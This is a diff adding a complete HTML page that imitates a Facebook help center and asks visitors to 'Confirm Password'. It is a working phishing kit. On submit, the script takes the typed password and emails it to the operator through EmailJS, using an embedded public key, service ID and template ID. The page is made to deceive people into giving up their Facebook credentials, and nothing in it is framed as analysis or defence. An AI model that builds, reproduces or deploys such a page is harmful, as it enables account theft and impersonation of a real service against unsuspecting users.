@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Confirm Password</title>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "I4YkDSw2dTWs4TVuU",
+      });
+   })();
+</script>
+
+    <link rel="stylesheet" href="./src2.css" />
+  </head>
+  <body>
+    <div class="header_container">
+      <nav class="header__nav">
+        <p class="facebook">facebook</p>
+        <header>
+          <input
+            class="nav-search"
+            type="text"
+            placeholder="How can we help?"
+          />
+        </header>
+      </nav>
+      <div class="help">
+        <div class="container__helper">
+          <li>
+            <a class="help__a" href="#">
+              <!-- <img src="./src/house-solid.svg" /> -->
+              Help Center</a
+            >
+          </li>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="form-box">
+      <form id="myNewForm" method="POST" target="_blank">
+        <br />
+        <label for="text" class="label">Confirm Password</label>
+        <input class="input" type="text" name="Password" required />
+        <div class="visibility">
+          <span class="visibility-pw">Visibility on</span>
+        </div>
+        <br />
+        <div id="btn-div" class="btn-div">
+          <button class="btn" type="submit">Submit</button>
+        </div>
+      </form>
+    </div>
+    <div class="footer">
+      <div class="footer__container">
+        <ul class="footer-ul">
+          <li><a href="">About</a></li>
+          <li><a href="">Privacy Policy</a></li>
+          <li><a href="">Careers</a></li>
+        </ul>
+        <ul class="footer-ul">
+          <li><a href="">AdChoices</a></li>
+          <li><a href="">Create ad</a></li>
+          <li><a href="">Create Page</a></li>
+        </ul>
+        <ul class="footer-ul">
+          <li><a href="">Terms and policies</a></li>
+          <li><a href="">Cookies</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="meta">
+      <!-- <figure class="wp-block-image size-full is-resized">
+        <img
+          class="img-meta"
+          fetchpriority="high"
+          decoding="async"
+          src="./src/from-meta-8.jpg"
+          alt=""
+          class="wp-image-312"
+        />
+      </figure> -->
+    </div>
+  </body>
+  <script>
+    document.getElementById("myNewForm").addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form submission
+      console.log("the function has run")
+
+      // Extract form data
+      const formData = new FormData(this);
+      console.log("form data is ",formData);
+      const formObj = {};
+      formData.forEach((value, key) => {
+        formObj[key] = value;
+        
+      });
+      console.log("new form",formObj);
+
+      // Log the form data to the console
+        emailjs.send('service_zcjqov6', 'template_8f85bpu', {name3:formObj.Password}).then(
+        (response) => {
+          console.log('SUCCESS!', response.status, response.text);
+          document.getElementById('my-form-status').textContent = 'Form submitted successfully!';
+          console.log(formObj)
+        },
+        (error) => {
+          console.log('FAILED...', error);
+          document.getElementById('my-form-status').textContent = 'Form submission failed.';
+        }
+      );
+    });
+  </script>
+  <script src="./pw.js"></script>
+</html>
